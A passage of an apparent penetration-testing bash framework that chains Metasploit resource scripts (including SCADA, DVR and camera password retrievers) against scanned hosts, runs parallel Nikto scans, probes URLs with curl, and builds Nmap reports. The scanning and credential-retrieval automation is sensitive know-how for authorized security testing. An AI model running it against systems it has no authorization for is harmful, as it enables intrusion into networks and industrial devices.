     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1604.txt|g" /tmp/resource/1604-udp-citrix.rc
     cat /tmp/resource/1604-udp-citrix.rc >> /tmp/master
fi

if [[ -e $name/1720.txt ]]; then
     echo "     H323"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1720.txt|g" /tmp/resource/1720-h323.rc
     cat /tmp/resource/1720-h323.rc >> /tmp/master
fi

if [[ -e $name/1900.txt ]]; then
     echo "     UPnP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1900.txt|g" /tmp/resource/1900-udp-upnp.rc
     cat /tmp/resource/1900-udp-upnp.rc >> /tmp/master
fi

if [[ -e $name/2049.txt ]]; then
     echo "     NFS"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/2049.txt|g" /tmp/resource/2049-nfs.rc
     cat /tmp/resource/2049-nfs.rc >> /tmp/master
fi

if [[ -e $name/2362.txt ]]; then
     echo "     SCADA Digi"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/2362.txt|g" /tmp/resource/2362-udp-scada.rc
     cat /tmp/resource/2362-udp-scada.rc >> /tmp/master
fi

if [[ -e $name/3000.txt ]]; then
     echo "     EMC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3000.txt|g" /tmp/resource/3000-emc.rc
     cat /tmp/resource/3000-emc.rc >> /tmp/master
fi

if [[ -e $name/3050.txt ]]; then
     echo "     Borland InterBase Services Manager Information"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3050.txt|g" /tmp/resource/3050-borland.rc
     cat /tmp/resource/3050-borland.rc >> /tmp/master
fi

if [[ -e $name/3306.txt ]]; then
     echo "     MySQL"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3306.txt|g" /tmp/resource/3306-mysql.rc
     cat /tmp/resource/3306-mysql.rc >> /tmp/master
fi

if [[ -e $name/3310.txt ]]; then
     echo "     ClamAV"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3310.txt|g" /tmp/resource/3310-clamav.rc
     cat /tmp/resource/3310-clamav.rc >> /tmp/master
fi

if [[ -e $name/3389.txt ]]; then
     echo "     RDP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3389.txt|g" /tmp/resource/3389-rdp.rc
     cat /tmp/resource/3389-rdp.rc >> /tmp/master
fi

if [[ -e $name/3500.txt ]]; then
     echo "     EMC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3500.txt|g" /tmp/resource/3500-emc.rc
     cat /tmp/resource/3500-emc.rc >> /tmp/master
fi

if [[ -e $name/4800.txt ]]; then
     echo "     Moxa"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/4800.txt|g" /tmp/resource/4800-udp-moxa.rc
     cat /tmp/resource/4800-udp-moxa.rc >> /tmp/master
fi

if [[ -e $name/5000.txt ]]; then
     echo "     Satel"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5000.txt|g" /tmp/resource/5000-satel.rc
     cat /tmp/resource/5000-satel.rc >> /tmp/master
fi

if [[ -e $name/5040.txt ]]; then
     echo "     DCE/RPC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5040.txt|g" /tmp/resource/5040-dcerpc.rc
     cat /tmp/resource/5040-dcerpc.rc >> /tmp/master
fi

if [[ -e $name/5060.txt ]]; then
     echo "     SIP UDP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5060.txt|g" /tmp/resource/5060-udp-sip.rc
     cat /tmp/resource/5060-udp-sip.rc >> /tmp/master
fi

if [[ -e $name/5060-tcp.txt ]]; then
     echo "     SIP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5060-tcp.txt|g" /tmp/resource/5060-sip.rc
     cat /tmp/resource/5060-sip.rc >> /tmp/master
fi

if [[ -e $name/5432.txt ]]; then
     echo "     Postgres"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5432.txt|g" /tmp/resource/5432-postgres.rc
     cat /tmp/resource/5432-postgres.rc >> /tmp/master
fi

if [[ -e $name/5560.txt ]]; then
     echo "     Oracle iSQL"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5560.txt|g" /tmp/resource/5560-oracle.rc
     cat /tmp/resource/5560-oracle.rc >> /tmp/master
fi

if [[ -e $name/5631.txt ]]; then
     echo "     pcAnywhere"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5631.txt|g" /tmp/resource/5631-pcanywhere.rc
     cat /tmp/resource/5631-pcanywhere.rc >> /tmp/master
fi

if [[ -e $name/5632.txt ]]; then
     echo "     pcAnywhere"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5632.txt|g" /tmp/resource/5632-pcanywhere.rc
     cat /tmp/resource/5632-pcanywhere.rc >> /tmp/master
fi

if [[ -e $name/5900.txt ]]; then
     echo "     VNC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5900.txt|g" /tmp/resource/5900-vnc.rc
     cat /tmp/resource/5900-vnc.rc >> /tmp/master
fi

if [[ -e $name/5920.txt ]]; then
     echo "     CCTV DVR"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5920.txt|g" /tmp/resource/5920-cctv.rc
     cat /tmp/resource/5920-cctv.rc >> /tmp/master
fi

if [[ -e $name/5984.txt ]]; then
     echo "     CouchDB"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5984.txt|g" /tmp/resource/5984-couchdb.rc
     cat /tmp/resource/5984-couchdb.rc >> /tmp/master
fi

if [[ -e $name/5985.txt ]]; then
     echo "     winrm"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5985.txt|g" /tmp/resource/5985-winrm.rc
     cat /tmp/resource/5985-winrm.rc >> /tmp/master
fi

if [[ -e $name/x11.txt ]]; then
     echo "     x11"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/x11.txt|g" /tmp/resource/6000-5-x11.rc
     cat /tmp/resource/6000-5-x11.rc >> /tmp/master
fi

if [[ -e $name/6379.txt ]]; then
     echo "     Redis"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/6379.txt|g" /tmp/resource/6379-redis.rc
     cat /tmp/resource/6379-redis.rc >> /tmp/master
fi

if [[ -e $name/7777.txt ]]; then
     echo "     Backdoor"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/7777.txt|g" /tmp/resource/7777-backdoor.rc
     cat /tmp/resource/7777-backdoor.rc >> /tmp/master
fi

if [[ -e $name/8000.txt ]]; then
     echo "     Canon"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8000.txt|g" /tmp/resource/8000-canon.rc
     cat /tmp/resource/8000-canon.rc >> /tmp/master
fi

if [[ -e $name/8080.txt ]]; then
     echo "     Tomcat"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8080.txt|g" /tmp/resource/8080-tomcat.rc
     cat /tmp/resource/8080-tomcat.rc >> /tmp/master
fi

if [[ -e $name/8080.txt ]]; then
     echo "     Oracle"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8080.txt|g" /tmp/resource/8080-oracle.rc
     cat /tmp/resource/8080-oracle.rc >> /tmp/master
fi

if [[ -e $name/8222.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8222.txt|g" /tmp/resource/8222-vmware.rc
     cat /tmp/resource/8222-vmware.rc >> /tmp/master
fi

if [[ -e $name/8400.txt ]]; then
     echo "     Adobe"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8400.txt|g" /tmp/resource/8400-adobe.rc
     cat /tmp/resource/8400-adobe.rc >> /tmp/master
fi

if [[ -e $name/8834.txt ]]; then
     echo "     Nessus"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8834.txt|g" /tmp/resource/8834-nessus.rc
     cat /tmp/resource/8834-nessus.rc >> /tmp/master
fi

if [[ -e $name/9000.txt ]]; then
     echo "     Sharp DVR Password Retriever"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9000.txt|g" /tmp/resource/9000-sharp.rc
     cat /tmp/resource/9000-sharp.rc >> /tmp/master
fi

if [[ -e $name/9084.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9084.txt|g" /tmp/resource/9084-vmware.rc
     cat /tmp/resource/9084-vmware.rc >> /tmp/master
fi

if [[ -e $name/9100.txt ]]; then
     echo "     Printers"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9100.txt|g" /tmp/resource/9100-printers.rc
     cat /tmp/resource/9100-printers.rc >> /tmp/master
fi

if [[ -e $name/9999.txt ]]; then
     echo "     Telnet"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9999.txt|g" /tmp/resource/9999-telnet.rc
     cat /tmp/resource/9999-telnet.rc >> /tmp/master
fi

if [[ -e $name/13364.txt ]]; then
     echo "     Rosewill RXS-3211 IP Camera Password Retriever"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/13364.txt|g" /tmp/resource/13364-rosewill.rc
     cat /tmp/resource/13364-rosewill.rc >> /tmp/master
fi

if [[ -e $name/17185.txt ]]; then
     echo "     VxWorks"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/17185.txt|g" /tmp/resource/17185-udp-vxworks.rc
     cat /tmp/resource/17185-udp-vxworks.rc >> /tmp/master
fi

if [[ -e $name/28784.txt ]]; then
     echo "     SCADA Koyo DirectLogic PLC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/28784.txt|g" /tmp/resource/28784-scada.rc
     cat /tmp/resource/28784-scada.rc >> /tmp/master
fi

if [[ -e $name/30718.txt ]]; then
     echo "     Telnet"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/30718.txt|g" /tmp/resource/30718-telnet.rc
     cat /tmp/resource/30718-telnet.rc >> /tmp/master
fi

if [[ -e $name/37777.txt ]]; then
     echo "     Dahua DVR"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/37777.txt|g" /tmp/resource/37777-dahua-dvr.rc
     cat /tmp/resource/37777-dahua-dvr.rc >> /tmp/master
fi

if [[ -e $name/46824.txt ]]; then
     echo "     SCADA Sielco Sistemi"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/46824.txt|g" /tmp/resource/46824-scada.rc
     cat /tmp/resource/46824-scada.rc >> /tmp/master
fi

if [[ -e $name/50000.txt ]]; then
     echo "     db2"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/50000.txt|g" /tmp/resource/50000-db2.rc
     cat /tmp/resource/50000-db2.rc >> /tmp/master
fi

echo db_export -f xml -a $name/metasploit.xml >> /tmp/master
echo exit >> /tmp/master

x=$(wc -l /tmp/master | cut -d ' ' -f1)

if [ $x -eq 3 ]; then
     echo 2>/dev/null
else
     echo
     sed 's/\/\//\//g' /tmp/master > $name/master.rc
     msfdb init
     msfconsole -r $name/master.rc
     cat tmpmsf | egrep -iv "(> exit|> run|% complete|Attempting to extract|Authorization not requested|Checking if file|completed|Connecting to the server|Connection reset by peer|data_connect failed|db_export|did not reply|does not appear|doesn't exist|Finished export|Handshake failed|ineffective|It doesn't seem|Login Fail|negotiation failed|NoMethodError|No relay detected|no response|No users found|not be identified|not found|NOT VULNERABLE|Providing some time|request timeout|responded with error|RPORT|RHOSTS|Scanning for vulnerable|Shutting down the TFTP|Spooling|Starting export|Starting TFTP server|Starting VNC login|THREADS|Timed out after|timed out|Trying to acquire|Unable to|unknown state)" > $name/metasploit.txt
     rm $name/master.rc
	rm tmpmsf
fi
}

##############################################################################################################

f_enumerate(){
clear
f_banner
f_typeofscan

echo -n "Enter the location of your previous scan: "
read -e location

# Check for no answer
if [[ -z $location ]]; then
     f_error
fi

# Check for wrong answer
if [ ! -d $location ]; then
     f_error
fi

name=$location

echo
echo -n "Set scan delay. (0-5, enter for normal) "
read delay

# Check for no answer
if [[ -z $delay ]]; then
     delay='0'
fi

if [ $delay -lt 0 ] || [ $delay -gt 5 ]; then
     f_error
fi

f_scripts
echo
echo $medium
f_run-metasploit

echo
echo -e "\x1B[1;34mStopping Postgres.\x1B[0m"
service postgresql stop

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The supporting data folder is located at \x1B[1;33m%s\x1B[0m\n' $name
echo
echo
exit
}

##############################################################################################################

f_report(){
END=$(date +%r\ %Z)
filename=$name/report.txt
host=$(wc -l $name/hosts.txt | cut -d ' ' -f1)

echo "Nmap Report" > $filename
date +%A" - "%B" "%d", "%Y >> $filename
echo >> $filename
echo "Start time   $START" >> $filename
echo "Finish time  $END" >> $filename
echo "Scanner IP   $ip" >> $filename
echo >> $filename
echo $medium >> $filename
echo >> $filename

if [ -e $name/script-smbvulns.txt ]; then
     echo "May be vulnerable to MS08-067 & more." >> $filename
     echo >> $filename
     cat $name/script-smbvulns.txt >> $filename
     echo >> $filename
     echo $medium >> $filename
     echo >> $filename
fi

echo "Hosts Discovered ($host)" >> $filename
echo >> $filename
cat $name/hosts.txt >> $filename 2>/dev/null
echo >> $filename

if [[ ! -s $name/ports.txt ]]; then
     rm -rf "$name" tmp*
     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     echo -e "\x1B[1;33mNo hosts found with open ports.\x1B[0m"
     echo
     echo
     exit
else
     ports=$(wc -l $name/ports.txt | cut -d ' ' -f1)
fi

echo $medium >> $filename
echo >> $filename
echo "Open Ports ($ports)" >> $filename
echo >> $filename

if [ -s $name/ports-tcp.txt ]; then
     echo "TCP Ports" >> $filename
     cat $name/ports-tcp.txt >> $filename
     echo >> $filename
fi

if [ -s $name/ports-udp.txt ]; then
     echo "UDP Ports" >> $filename
     cat $name/ports-udp.txt >> $filename
     echo >> $filename
fi

echo $medium >> $filename

if [ -e $name/banners.txt ]; then
     banners=$(wc -l $name/banners.txt | cut -d ' ' -f1)
     echo >> $filename
     echo "Banners ($banners)" >> $filename
     echo >> $filename
     cat $name/banners.txt >> $filename
     echo >> $filename
     echo $medium >> $filename
fi

echo >> $filename
echo "High Value Hosts by Port" >> $filename
echo >> $filename

HVPORTS="13 19 21 22 23 25 37 53 67 69 70 79 80 102 110 111 119 123 135 137 139 143 161 389 407 433 443 445 465 500 502 512 513 514 523 524 548 554 563 587 623 631 636 771 831 873 902 993 995 998 1050 1080 1099 1158 1344 1352 1433 1434 1521 1604 1720 1723 1883 1900 1911 1962 2049 2202 2302 2362 2375 2628 2947 3000 3031 3050 3260 3306 3310 3389 3478 3500 3632 3671 4369 4800 5019 5040 5060 5353 5432 5560 5631 5632 5666 5672 5683 5850 5900 5920 5984 5985 6000 6001 6002 6003 6004 6005 6379 6481 6666 7210 7634 7777 8000 8009 8080 8081 8091 8140 8222 8332 8333 8400 8443 8834 9000 9084 9100 9160 9600 9999 10000 11211 12000 12345 13364 17185 19150 27017 28784 30718 31337 35871 37777 44818 46824 47808 49152 50000 50030 50060 50070 50075 50090 60010 60030"

for i in $HVPORTS; do
     if [[ -e $name/$i.txt ]]; then
          echo "Port $i" >> $filename
          cat $name/$i.txt >> $filename
          echo >> $filename
     fi
done

echo $medium >> $filename
echo >> $filename
cat $name/nmap.txt >> $filename
echo $medium >> $filename
echo $medium >> $filename
echo >> $filename
echo "Nmap Scripts" >> $filename

SCRIPTS="script-13 script-21 script-22 script-23 script-smtp script-37 script-53 script-67 script-70 script-79 script-102 script-110 script-111 script-nntp script-123 script-137 script-139 script-143 script-161 script-389 script-443 script-445 script-500 script-523 script-524 script-548 script-554 script-623 script-631 script-636 script-873 script-993 script-995 script-1050 script-1080 script-1099 script-1344 script-1352 script-1433 script-1434 script-1521 script-1604 script-1723 script-1883 script-1911 script-1962 script-2049 script-2202 script-2302 script-2375 script-2628 script-2947 script-3031 script-3260 script-3306 script-3310 script-3389 script-3478 script-3632 script-3671 script-4369 script-5019 script-5060 script-5353 script-5666 script-5672 script-5683 script-5850 script-5900 script-5984 script-x11 script-6379 script-6481 script-6666 script-7210 script-7634 script-8000 script-8009 script-8081 script-8091 script-8140 script-bitcoin script-9100 script-9160 script-9600 script-9999 script-10000 script-11211 script-12000 script-12345 script-17185 script-19150 script-27017 script-31337 script-35871 script-44818 script-47808 script-49152 script-50000 script-hadoop script-apache-hbase"

for i in $SCRIPTS; do
     if [[ -e $name/"$i.txt" ]]; then
          cat $name/"$i.txt" >> $filename
          echo $medium >> $filename
     fi
done

if [ -e $name/script-enum4linux.txt ] || [ -e $name/script-smbclient.txt ] || [ -e $name/ike-scan.txt ]; then
     echo $medium >> $filename
     echo >> $filename
     echo "Additional Enumeration" >> $filename

     if [ -e $name/script-enum4linux.txt ]; then
          cat $name/script-enum4linux.txt >> $filename
          echo $medium >> $filename
          echo >> $filename
     fi

     if [ -e $name/script-smbclient.txt ]; then
          cat $name/script-smbclient.txt >> $filename
          echo $medium >> $filename
     fi

     if [ -e $name/script-ike-scan.txt ]; then
          cat $name/script-ike-scan.txt >> $filename
          echo $medium >> $filename
     fi
fi

mv $name $home/data/

START=0
END=0

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$name/report.txt
echo
echo
exit
}

##############################################################################################################

f_directObjectRef(){
clear
f_banner

echo -e "\x1B[1;34mUsing Burp, authenticate to a site, map & Spider, then log out.\x1B[0m"
echo -e "\x1B[1;34mTarget > Site map > select the URL > right click > Copy URLs in this host.\x1B[0m"
echo -e "\x1B[1;34mPaste the results into a new file.\x1B[0m"

f_location

for i in $(cat $location); do
     curl -sk -w "%{http_code} - %{url_effective} \\n" "$i" -o /dev/null 2>&1 | tee -a tmp
done

cat tmp | sort -u > DirectObjectRef.txt
mv DirectObjectRef.txt $home/data/DirectObjectRef.txt
rm tmp

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/DirectObjectRef.txt
echo
echo
exit
}

##############################################################################################################

f_multitabs(){
f_runlocally
clear
f_banner

echo -e "\x1B[1;34mOpen multiple tabs in $browser with:\x1B[0m"
echo
echo "1.  List"
echo "2.  Directories from a domain's robot.txt."
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_location
     echo -n "Use SSL? (y/N) "
     read ssl

     $web &
     sleep 2

     if [ -z $ssl ]; then
          for i in $(cat $location); do
               $web http://$i &
               sleep 1
          done
     elif [ "$ssl" == "y" ]; then
          for i in $(cat $location); do
               $web https://$i &
               sleep 1
          done
     else
          f_error
     fi
     ;;

     2)
     echo
     echo $medium
     echo
     echo "Usage: target.com or target-IP"
     echo
     echo -n "Domain: "
     read domain

     # Check for no answer
     if [[ -z $domain ]]; then
          f_error
     fi

     # Check for OS X
     if [[ `uname` == 'Darwin' ]]; then
          /usr/local/bin/wget -q $domain/robots.txt
     else
          wget -q $domain/robots.txt
     fi

     # Check if the file is empty
     if [ ! -s robots.txt ]; then
          echo
          echo -e "\x1B[1;31m$medium\x1B[0m"
          echo
          echo -e "\x1B[1;31m                          *** No robots file discovered. ***\x1B[0m"
          echo
          echo -e "\x1B[1;31m$medium\x1B[0m"
          sleep 2
          f_main
     fi

     grep 'Disallow' robots.txt | awk '{print $2}' > tmp

     $web &
     sleep 2

     for i in $(cat tmp); do
          $web http://$domain$i &
          sleep 1
     done

     rm robots.txt
     mv tmp $home/data/$domain-robots.txt

     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$domain-robots.txt
     echo
     echo
     exit
     ;;

     3) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_nikto(){
f_runlocally
clear
f_banner

echo -e "\x1B[1;34mRun multiple instances of Nikto in parallel.\x1B[0m"
echo
echo "1.  List of IPs."
echo "2.  List of IP:port."
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location

     echo
     echo -n "Port (default 80): "
     read port
     echo

     # Check if port is a number
     echo "$port" | grep -E "^[0-9]+$" 2>/dev/null
     isnum=$?

     if [ $isnum -ne 0 ] && [ ${#port} -gt 0 ]; then
          f_error
     fi

     if [ ${#port} -eq 0 ]; then
          port=80
     fi

     if [ $port -lt 1 ] || [ $port -gt 65535 ]; then
          f_error
     fi

     mkdir $home/data/nikto-$port

     while read -r line; do
          xdotool key ctrl+shift+t
          xdotool type "nikto -h $line -port $port -Format htm --output $home/data/nikto-$port/$line.htm ; exit"
          sleep 1
          xdotool key Return
     done < "$location"
     ;;

     2)
     f_location

     mkdir $home/data/nikto

     while IFS=: read -r host port; do
          xdotool key ctrl+shift+t
          sleep 1
          xdotool type "nikto -h $host -port $port -Format htm --output $home/data/nikto/$host-$port.htm ; exit"
          sleep 1
          xdotool key Return
     done < "$location"
     ;;

     3) f_main;;
     *) f_error;;
esac

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nikto/
echo
echo
exit
}

##############################################################################################################

f_parse(){
clear
f_banner

echo -e "\x1B[1;34mParse XML to CSV.\x1B[0m"
echo
echo "1.  Burp (Base64)"
echo "2.  Nessus (.nessus)"
echo "3.  Nexpose (XML 2.0)"
echo "4.  Nmap"
echo "5.  Qualys"
echo "6.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location
     parsers/parse-burp.py $location

     mv burp.csv $home/data/burp-`date +%H:%M:%S`.csv

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/burp-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     2)
     f_location
     parsers/parse-nessus.py $location

     # Delete findings with a solution of n/a
	grep -v 'n/a' nessus.csv > tmp.csv
     # Delete findings with CVSS score of 0 and solution of n/a
     egrep -v "(Adobe Acrobat Detection|Adobe Extension Manager Installed|Adobe Flash Player for Mac Installed|Adobe Flash Professional Detection|Adobe Illustrator Detection|Adobe Photoshop Detection|Adobe Reader Detection|Adobe Reader Installed \(Mac OS X\)|ADSI Settings|Advanced Message Queuing Protocol Detection|AJP Connector Detection|AirWatch API Settings|Antivirus Software Check|Apache Axis2 Detection|Apache HTTP Server HttpOnly Cookie Information Disclosure|Apple Filing Protocol Server Detection|Apple Profile Manager API Settings|AppSocket & socketAPI Printers - Do Not Scan|Appweb HTTP Server Version|ASG-Sentry SNMP Agent Detection|Authenticated Check: OS Name and Installed Package Enumeration|Autodesk AutoCAD Detection|Backported Security Patch Detection \(FTP\)|Backported Security Patch Detection \(SSH\)|Authenticated Check: OS Name and Installed Package Enumeration|Backported Security Patch Detection \(WWW\)|BACnet Protocol Detection|BIOS Version Information \(via SMB\)|BIOS Version \(WMI\)|Blackboard Learn Detection|Broken Web Servers|CA Message Queuing Service Detection|CDE Subprocess Control Service \(dtspcd\) Detection|Check Point FireWall-1 ICA Service Detection|Check Point SecuRemote Hostname Information Disclosure|Cisco AnyConnect Secure Mobility Client Detection|CISCO ASA SSL VPN Detection|Cisco TelePresence Multipoint Control Unit Detection|Cleartext protocols settings|COM+ Internet Services (CIS) Server Detection|Common Platform Enumeration \(CPE\)|Computer Manufacturer Information \(WMI\)|CORBA IIOP Listener Detection|Database settings|DB2 Administration Server Detection|DB2 Discovery Service Detection|DCE Services Enumeration|Dell OpenManage Web Server Detection|Derby Network Server Detection|Detect RPC over TCP|Device Hostname|Device Type|DNS Sender Policy Framework \(SPF\) Enabled|DNS Server DNSSEC Aware Resolver|DNS Server Fingerprinting|DNS Server Version Detection|Do not scan fragile devices|EMC SMARTS Application Server Detection|Erlang Port Mapper Daemon Detection|Ethernet Card Manufacturer Detection|External URLs|FileZilla Client Installed|firefox Installed \(Mac OS X\)|Firewall Rule Enumeration|Flash Player Detection|FTP Service AUTH TLS Command Support|FTP Server Detection|Global variable settings|Good MDM Settings|Google Chrome Detection \(Windows\)|Google Chrome Installed \(Mac OS X\)|Google Picasa Detection \(Windows\)|Host Fully Qualified Domain Name \(FQDN\) Resolution|HMAP Web Server Fingerprinting|Hosts File Whitelisted Entries|HP Data Protector Components Version Detection|HP OpenView BBC Service Detection|HP SiteScope Detection|HSTS Missing From HTTPS Server|HTTP cookies import|HTTP Cookie 'secure' Property Transport Mismatch|HTTP login page|HTTP Methods Allowed \(per directory\)|HTTP Proxy Open Relay Detection|HTTP Reverse Proxy Detection|HTTP Server Cookies Set|HTTP Server Type and Version|HTTP TRACE \/ TRACK Methods Allowed|HTTP X-Frame-Options Response Header Usage|Hyper-V Virtual Machine Detection|HyperText Transfer Protocol \(HTTP\) Information|IBM Domino Detection \(uncredentialed check\)|IBM Domino Installed|IBM GSKit Installed|IBM iSeries Credentials|IBM Lotus Notes Detection|IBM Notes Client Detection|IBM Remote Supervisor Adapter Detection \(HTTP\)|IBM Tivoli Endpoint Manager Client Detection|IBM Tivoli Endpoint Manager Web Server Detection|IBM Tivoli Storage Manager Client Installed|IBM Tivoli Storage Manager Service Detection|IBM WebSphere Application Server Detection|IMAP Service Banner Retrieval|IMAP Service STARTTLS Command Support|IP Protocols Scan|IPMI Cipher Suites Supported|IPMI Versions Supported|iTunes Version Detection \(credentialed check\)|Kerberos configuration|Kerberos Information Disclosure|L2TP Network Server Detection|LDAP Server Detection|LDAP Crafted Search Request Server Information Disclosure|LDAP Service STARTTLS Command Support|LibreOffice Detection|Login configurations|Lotus Sametime Detection|MacOSX Cisco AnyConnect Secure Mobility Client Detection|McAfee Common Management Agent Detection|McAfee Common Management Agent Installation Detection|McAfee ePolicy Orchestrator Application Server Detection|MediaWiki Detection|Microsoft Exchange Installed|Microsoft Internet Explorer Enhanced Security Configuration Detection|Microsoft Internet Explorer Version Detection|Microsoft Lync Server Installed|Microsoft Malicious Software Removal Tool Installed|Microsoft .NET Framework Detection|Microsoft .NET Handlers Enumeration|Microsoft Office Detection|Microsoft OneNote Detection|Microsoft Patch Bulletin Feasibility Check|Microsoft Revoked Digital Certificates Enumeration|Microsoft Silverlight Detection|Microsoft Silverlight Installed \(Mac OS X\)|Microsoft SQL Server STARTTLS Support|Microsoft SMS\/SCCM Installed|Microsoft System Center Configuration Manager Client Installed|Microsoft System Center Operations Manager Component Installed|Microsoft Update Installed|Microsoft Windows AutoRuns Boot Execute|Microsoft Windows AutoRuns Codecs|Microsoft Windows AutoRuns Explorer|Microsoft Windows AutoRuns Internet Explorer|Microsoft Windows AutoRuns Known DLLs|Microsoft Windows AutoRuns Logon|Microsoft Windows AutoRuns LSA Providers|Microsoft Windows AutoRuns Network Providers|Microsoft Windows AutoRuns Print Monitor|Microsoft Windows AutoRuns Registry Hijack Possible Locations|Microsoft Windows AutoRuns Report|Microsoft Windows AutoRuns Scheduled Tasks|Microsoft Windows AutoRuns Services and Drivers|Microsoft Windows AutoRuns Unique Entries|Microsoft Windows AutoRuns Winlogon|Microsoft Windows AutoRuns Winsock Provider|Microsoft Windows 'CWDIllegalInDllSearch' Registry Setting|Microsoft Windows Installed Hotfixes|Microsoft Windows NTLMSSP Authentication Request Remote Network Name Disclosure|Microsoft Windows Process Module Information|Microsoft Windows Process Unique Process Name|Microsoft Windows Remote Listeners Enumeration \(WMI\)|Microsoft Windows SMB : Obtains the Password Policy|Microsoft Windows SMB LanMan Pipe Server Listing Disclosure|Microsoft Windows SMB Log In Possible|Microsoft Windows SMB LsaQueryInformationPolicy Function NULL Session Domain SID Enumeration|Microsoft Windows SMB NativeLanManager Remote System Information Disclosure|Microsoft Windows SMB Registry : Enumerate the list of SNMP communities|Microsoft Windows SMB Registry : Nessus Cannot Access the Windows Registry|Microsoft Windows SMB Registry : OS Version and Processor Architecture|Microsoft Windows SMB Registry : Remote PDC\/BDC Detection|Microsoft Windows SMB Versions Supported|Microsoft Windows SMB Registry : Vista \/ Server 2008 Service Pack Detection|Microsoft Windows SMB Registry : XP Service Pack Detection|Microsoft Windows SMB Registry Remotely Accessible|Microsoft Windows SMB Registry : Win 7 \/ Server 2008 R2 Service Pack Detection|Microsoft Windows SMB Registry : Windows 2000 Service Pack Detection|Microsoft Windows SMB Registry : Windows 2003 Server Service Pack Detection|Microsoft Windows SMB Service Detection|Microsoft Windows Update Installed|MobileIron API Settings|MSRPC Service Detection|Modem Enumeration \(WMI\)|MongoDB Settings|Mozilla Foundation Application Detection|MySQL Server Detection|Nessus Internal: Put cgibin in the KB|Nessus Scan Information|Nessus SNMP Scanner|NetBIOS Multiple IP Address Enumeration|Netstat Active Connections|Netstat Connection Information|netstat portscanner \(SSH\)|Netstat Portscanner \(WMI\)|Network Interfaces Enumeration \(WMI\)|Network Time Protocol \(NTP\) Server Detection|Nmap \(XML file importer\)|Non-compliant Strict Transport Security (STS)|OpenSSL Detection|OpenSSL Version Detection|Oracle Application Express \(Apex\) Detection|Oracle Application Express \(Apex\) Version Detection|Oracle Java Runtime Environment \(JRE\) Detection \(Unix\)|Oracle Java Runtime Environment \(JRE\) Detection|Oracle Installed Software Enumeration \(Windows\)|Oracle Settings|OS Identification|Palo Alto Networks PAN-OS Settings|Patch Management: Dell KACE K1000 Settings|Patch Management: IBM Tivoli Endpoint Manager Server Settings|Patch Management: Patch Schedule From Red Hat Satellite Server|Patch Management: Red Hat Satellite Server Get Installed Packages|Patch Management: Red Hat Satellite Server Get Managed Servers|Patch Management: Red Hat Satellite Server Get System Information|Patch Management: Red Hat Satellite Server Settings|Patch Management: SCCM Server Settings|Patch Management: Symantec Altiris Settings|Patch Management: VMware Go Server Settings|Patch Management: WSUS Server Settings|PCI DSS compliance : options 